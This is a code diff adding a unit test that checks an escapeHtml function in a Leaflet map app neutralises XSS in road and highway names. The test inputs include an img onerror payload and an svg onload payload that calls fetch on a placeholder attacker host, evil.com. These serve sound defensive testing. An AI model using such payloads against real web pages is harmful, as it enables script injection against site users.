@@ -21,6 +21,19 @@ describe('Security & Sanitization Tests (Leaflet XSS Remediation)', () => {
   it('escapes single and double quotes and ampersands', () => {
     assert.equal(escapeHtml(`Tom & Jerry's "Adventure"`), `Tom &amp; Jerry&#39;s &quot;Adventure&quot;`)
   })
+
+  it('escapes malicious road names and tag injections with event handlers', () => {
+    const maliciousRoadName = 'Main St <img src=x onerror=alert(1)> "Expressway"'
+    const clean = escapeHtml(maliciousRoadName)
+    assert.equal(clean, 'Main St &lt;img src=x onerror=alert(1)&gt; &quot;Expressway&quot;')
+    assert.ok(!clean.includes('<img'))
+    assert.ok(!clean.includes('>'))
+
+    const maliciousHighway = '<svg/onload=fetch("http://evil.com")>'
+    const cleanHwy = escapeHtml(maliciousHighway)
+    assert.equal(cleanHwy, '&lt;svg/onload=fetch(&quot;http://evil.com&quot;)&gt;')
+    assert.ok(!cleanHwy.includes('<svg'))
+  })
 })
 
 describe('Unified Traffic Classification (SCI) Tests', () => {
